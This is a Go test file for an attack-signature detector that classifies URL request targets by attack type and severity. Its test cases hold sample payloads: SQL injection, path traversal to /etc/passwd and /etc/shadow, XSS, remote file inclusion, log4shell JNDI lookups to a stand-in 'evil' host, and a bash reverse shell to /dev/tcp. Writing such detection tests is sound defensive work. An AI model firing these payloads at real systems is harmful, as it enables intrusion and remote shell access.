package cti

import "testing"

func ids(ms []Match) []string {
	out := make([]string, len(ms))
	for i, m := range ms {
		out[i] = m.ID
	}
	return out
}

func TestDetectMatches(t *testing.T) {
	cases := []struct{ name, target, want string }{
		{"sqli union", "/item?id=1+UNION+SELECT+user,pass+FROM+users", "sql_injection"},
		{"sqli tautology", "/login?u=admin'%20or%201=1--", "sql_injection"},
		{"sqli double encoded", "/item?id=1%2520union%2520select%25201", "sql_injection"},
		{"traversal", "/download?f=../../etc/passwd", "path_traversal"},
		{"traversal encoded", "/a/%2e%2e/%2e%2e/etc/shadow", "path_traversal"},
		{"traversal double encoded", "/a/%252e%252e%252fetc", "path_traversal"},
		{"xss", "/s?q=<script>alert(1)</script>", "xss"},
		{"xss event", "/s?q=%22%20onerror=alert(1)", "xss"},
		{"rfi", "/index.php?page=http://evil.example/shell.txt", "rfi"},
		{"rfi php wrapper", "/i.php?x=php://input", "rfi"},
		{"cmd injection", "/ping?host=1.1.1.1;cat%20/etc/hosts", "command_injection"},
		{"cmd injection subshell", "/p?h=$(whoami)", "command_injection"},
		{"shellshock", "/cgi-bin/x.sh?a=()%20{%20:;};%20echo", "shellshock"},
		{"log4shell", "/?x=${jndi:ldap://evil/a}", "log4shell"},
		{"log4shell obfuscated", "/?x=${${lower:j}ndi:ldap://evil/a}", "log4shell"},
		{"reverse shell", "/x?c=bash%20-i%20>%26%20/dev/tcp/1.2.3.4/9", "reverse_shell"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := Detect(c.target)
			for _, m := range got {
				if m.ID == c.want {
					return
				}
			}
			t.Fatalf("Detect(%q) = %v, want it to include %s", c.target, ids(got), c.want)
		})
	}
}

func TestDetectBenign(t *testing.T) {
	for _, target := range []string{
		"",
		"/",
		"/index.html",
		"/search?q=union+station+select+seats",
		"/oauth/callback?redirect_uri=https://app.example.com/home&state=abc",
		"/page;jsessionid=ABC123?id=5",
		"/api/v1/users?id=42&sort=name",
		"/static/app.js?v=1.2.3",
		"/blog/how-to-use-javascript-promises",
		"/files/report-2026.pdf",
	} {
		if got := Detect(target); len(got) != 0 {
			t.Errorf("Detect(%q) = %v, want no match", target, ids(got))
		}
	}
}

func TestDetectSortedMostSevereFirst(t *testing.T) {
	got := Detect("/x?a=<script>&b=${jndi:ldap://e/a}&c=1+union+select+1")
	if len(got) < 3 {
		t.Fatalf("want 3+ matches, got %v", ids(got))
	}
	if got[0].Severity != "critical" {
		t.Errorf("first match severity = %s, want critical", got[0].Severity)
	}
	for i := 1; i < len(got); i++ {
		if Rank(got[i].Severity) > Rank(got[i-1].Severity) {
			t.Errorf("matches not sorted by severity: %v", ids(got))
		}
	}
}

func TestDetectHugeTargetIsBounded(t *testing.T) {
	big := make([]byte, 1<<20)
	for i := range big {
		big[i] = 'a'
	}
	if got := Detect("/" + string(big)); len(got) != 0 {
		t.Errorf("unexpected match on filler: %v", ids(got))
	}
}

func TestLookup(t *testing.T) {
	if m, ok := Lookup("sql_injection"); !ok || m.Severity != "high" || len(m.MITRE) == 0 {
		t.Errorf("Lookup(sql_injection) = %+v, %v", m, ok)
	}
	if _, ok := Lookup("nope"); ok {
		t.Error("Lookup(nope) found a signature")
	}
}
